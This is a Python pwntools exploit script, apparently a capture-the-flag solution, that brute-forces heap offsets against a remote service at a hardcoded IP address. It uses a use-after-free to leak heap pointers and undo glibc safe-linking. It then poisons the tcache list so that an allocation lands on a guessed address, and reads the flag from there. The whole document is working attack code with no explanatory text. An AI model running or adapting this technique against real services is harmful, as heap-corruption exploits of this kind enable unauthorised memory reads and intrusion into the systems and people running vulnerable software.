#!/usr/bin/env python3
"""
Brute force the offset to g_flag
We know tcache poisoning works, just need right address
"""
from pwn import *
import sys

context.log_level = 'warning'

def try_offset(offset):
    try:
        p = remote('52.76.96.108', 9005, timeout=5)
        p.recvuntil(b'> ')

        # Setup
        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'0')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'A'*16 + b'\n')

        p.sendline(b'3'); p.recvuntil(b'index: '); p.sendline(b'0')

        p.sendline(b'4'); p.recvuntil(b'index: '); p.sendline(b'0')
        p.recvuntil(b'data: ')
        data = p.recv(128); p.recv(1)
        fd0 = u64(data[0:8])
        X = fd0 << 12

        # Reuse for spell 1
        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'1')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'B'*16 + b'\n')

        # New for spell 2
        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'2')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'C'*16 + b'\n')

        # Banish both
        p.sendline(b'3'); p.recvuntil(b'index: '); p.sendline(b'1')
        p.sendline(b'3'); p.recvuntil(b'index: '); p.sendline(b'2')

        # Read UAF
        p.sendline(b'4'); p.recvuntil(b'index: '); p.sendline(b'2')
        p.recvuntil(b'data: ')
        data = p.recv(128); p.recv(1)
        fd2 = u64(data[0:8])

        spell2_shifted = fd2 ^ X
        spell2_addr = spell2_shifted << 12

        # Target = X + offset
        target = X + offset
        protected = spell2_shifted ^ target

        # Edit spell 2
        p.sendline(b'2'); p.recvuntil(b'index: '); p.sendline(b'2')
        p.recvuntil(b'data: ')
        payload = p64(protected) + b'\x00' * 120
        p.send(payload)

        # Allocate spell 3
        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'3')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'D'*16 + b'\n')

        # Allocate spell 4 (at target)
        p.sendline(b'1'); p.recvuntil(b'index: '); p.sendline(b'4')
        p.recvuntil(b'size: '); p.sendline(b'128')
        p.recvuntil(b'data: '); p.send(b'\n')

        # Read spell 4
        p.sendline(b'4'); p.recvuntil(b'index: '); p.sendline(b'4')
        p.recvuntil(b'data: ')
        data = p.recv(128); p.recv(1)

        p.close()
        return data
    except Exception as e:
        try: p.close()
        except: pass
        return None

# Try different offsets
# g_flag should be before X, so try negative offsets
# But also try positive offsets in case heap is different
offsets = [
    -0x90, -0x100, -0x200, -0x290, -0x2a0, -0x300, -0x320, -0x330,
    -0x400, -0x500, -0x1000, -0x2000, -0x10000, -0x110000, -0x120000, -0x130000,
    0x90, 0x100, 0x200, 0x290, 0x2a0, 0x300, 0x320, 0x330,
    0x1000, 0x10000, 0x110000, 0x120000, 0x130000
]

for off in offsets:
    data = try_offset(off)
    if data is None:
        print(f"[-] offset {hex(off)}: crashed")
        continue
    # Check for flag
    if b'flag' in data.lower() or b'CTF' in data or b'{' in data:
        print(f"[+] offset {hex(off)}: FOUND FLAG!")
        print(f"    data: {data}")
        # Find printable
        import re
        for m in re.finditer(rb'[\x20-\x7e]{4,}', data):
            print(f"    string: {m.group()}")
        sys.exit(0)
    else:
        non_zero = sum(1 for b in data if b != 0)
        print(f"[-] offset {hex(off)}: {non_zero} non-zero bytes, first 16: {data[:16].hex()}")
